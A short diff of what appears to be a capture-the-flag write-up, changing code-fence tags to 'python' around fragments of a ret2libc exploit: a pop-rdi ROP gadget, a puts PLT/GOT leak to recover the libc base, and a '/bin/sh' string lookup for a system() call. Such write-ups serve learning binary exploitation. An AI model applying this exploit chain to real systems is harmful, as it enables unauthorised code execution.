@@ -47,7 +47,7 @@ through the PLT address, passing in the address to the GOT entry for puts().
 Finally, we return to main, so we can put in another payload after leaking the
 libc base address.
 
-```
+```python
 poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
 pltputs = 0x401050 
 # hardcoded address since pwntools seems to have issues getting the plt address through the symbol table
@@ -63,7 +63,7 @@ entering the function, I ran into a segfault halfway through executing system().
 This alignment issue can be fixed by adding a ROP gadget consisting only of 
 "RET" to pad out the rsp.
 
-```
+```python
 libcoff = puts - libc.symbols['puts']
 binsh = next(libc.search(b'/bin/sh')) + libcoff
 
